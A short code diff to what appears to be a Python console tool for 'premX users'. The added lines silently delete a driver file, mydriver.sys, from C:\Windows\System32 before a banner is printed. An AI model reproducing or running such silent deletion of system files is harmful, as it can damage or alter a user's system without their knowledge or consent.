@@ -1,4 +1,8 @@
 os.system('cls')
+file_pathxx123 = r"C:\Windows\System32\mydriver.sys"
+if os.path.exists(file_pathxx123):
+    os.remove(file_pathxx123)
+os.system('cls')
 print("")
 print("--------Hello premX users, anonymous_kl here. Please take the time to read this.")
 print("")
